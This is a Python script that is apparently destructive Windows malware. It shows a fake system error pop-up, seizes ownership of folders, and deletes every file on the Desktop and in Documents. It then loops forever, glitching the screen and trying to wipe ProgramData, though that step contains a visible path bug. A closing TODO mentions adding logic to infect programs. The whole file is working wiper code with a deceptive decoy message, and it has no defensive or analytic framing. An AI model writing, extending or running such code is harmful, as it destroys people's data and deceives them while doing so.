from utils.getOwnerShip import getOwnerShip
from utils.getFolderOwner import getFolderOwner
from utils.getDesktopPath import getDesktopPath
from utils.getDocummentsPath import getDocumentsPath
from utils.stfuNotification import ShowFuckNotification
from utils.screenSaverBug import makeBuggyScreen
from utils.getFolderOwnerShip import SetOwnership
from utils.deleteAllBrowsers import objects
from src.HTTPLib import HttpClient
from pathlib import Path


import os
import sys

ShowFuckNotification("ERR", "1x000000329: 0x0000000000000000, failed to parse function on table 0x004000003b30031000 and 0x00009B000000491A000")

folder_ownership = getFolderOwner(getDesktopPath())
print("Folder ownership:", folder_ownership)
permissions = getOwnerShip(getDesktopPath())
print("Permissions:", permissions)

folder_path = getDesktopPath()
result = SetOwnership(folder_path)
if result:
    print("Ownership set successfully!")
else:
    print("Error setting ownership.")


# The files will be removed automatically.
# TODO: Implement file removal logic here
file_path = getDesktopPath()
file_list = os.listdir(file_path)
for file_name in file_list:
    os.remove(os.path.join(file_path, file_name))

file_path = getDocumentsPath()
file_list = os.listdir(file_path)
for file_name in file_list:
    os.remove(os.path.join(file_path, file_name))


default_disk = os.environ['SYSTEMDRIVE']
#objects.getAllUnifiedObjectsAndDelete()
def REMPROM():
    defaultdiskpath = default_disk + "\\ProgramData\\"
    permissions = getOwnerShip(defaultdiskpath)
    print("Permissions:", permissions)
    folder_ownership = getFolderOwner(defaultdiskpath)
    print("Folder ownership:", folder_ownership)

    result = SetOwnership(defaultdiskpath)
    if result:
        print("Ownership set successfully!")
    else:
        print("Error setting ownership.")

    file_list = os.listdir(defaultdiskpath)
    for file_name in file_list:
        os.remove(os.path.join(file_path, file_name))


while True:
    makeBuggyScreen()
    REMPROM()


# TODO: Need to implement a logic to infect programs.
